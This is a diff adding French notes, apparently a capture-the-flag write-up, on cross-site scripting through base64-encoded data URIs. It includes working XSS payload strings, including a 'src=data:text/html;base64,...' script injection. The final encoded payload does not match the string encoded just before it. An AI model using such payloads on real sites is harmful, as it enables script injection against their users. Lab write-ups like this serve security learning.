@@ -1,0 +1,24 @@
+Le cross-site scripting (XSS) est une tactique par laquelle un acteur malveillant injecte du code malveillant via un ou plusieurs scripts web dans un site web ou une web application légitime.
+Une Data URI, c’est une “URL” qui contient directement le contenu.
+
+data:text/html,<h1>hello</h1>
+ ou data:text/plain,hello
+et on voit un hello qui s'affiche, donc le html est accepte
+
+base64 :parce que du HTML brut dans une URL contient des caractères pénibles (<, >, guillemets, espaces) qui peuvent être :
+
+cassés par l’URL encoding,
+filtrés,
+mal interprétés.
+En base64, on n'a plus ces caractères “dangereux” : juste A-Z a-z 0-9 + / =.
+
+
+on encode : echo -n '<h1>HELLO</h1>' | base64
+pon trouve PGgxPkhFTExPPC9oMT4=
+donc on peut tester : data:text/html;base64,PGgxPkhFTExPPC9oMT4=
+
+doooonc, vu que ca fonctionne, on peut tenter d'injecter un script :
+echo -n '<script>test</script>' | base64
+on recupere PHNjcmlwdD50ZXN0PC9zY3JpcHQ+
+donc dans l'URL on met : src=data:text/html;base64,PHNjcmlwdD5hbGVydDwvc2NyaXB0Pg== et on obtient le flag
+
